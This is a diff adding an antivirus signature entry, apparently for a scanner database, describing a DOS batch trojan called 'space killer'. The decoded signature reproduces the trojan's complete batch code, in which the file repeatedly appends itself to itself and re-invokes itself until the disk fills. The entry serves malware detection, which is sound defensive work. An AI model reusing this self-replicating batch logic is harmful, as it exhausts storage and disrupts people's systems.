@@ -1,0 +1,5 @@
+VIRUS NAME: Dos.Trojan.Agent-36578
+TARGET TYPE: NORMALIZED ASCII TEXT
+OFFSET: 0
+DECODED SIGNATURE:
+@echo off cls @echo ===space killer ver. 1.0 by [harm]=== >>nul @echo ===coolharm@chat.ru================== >>nul @echo ===http://www.chat.ru/~coolharm====== >>nul @type %0>>%0 @call %0 @echo skdlfsjdkflsldfjskdflksdlkfjslkdjfklsjdklfsjdkljfslkdjlf @echo skdlfsjdkflsldfjskdflksdlkfjslkdjfklsjdklfsjdkljfslkdjlf @echo skdlfsjdkflsldfjskdflksdlkfjslkdjfklsjdklfsjdkljfslkdjlf
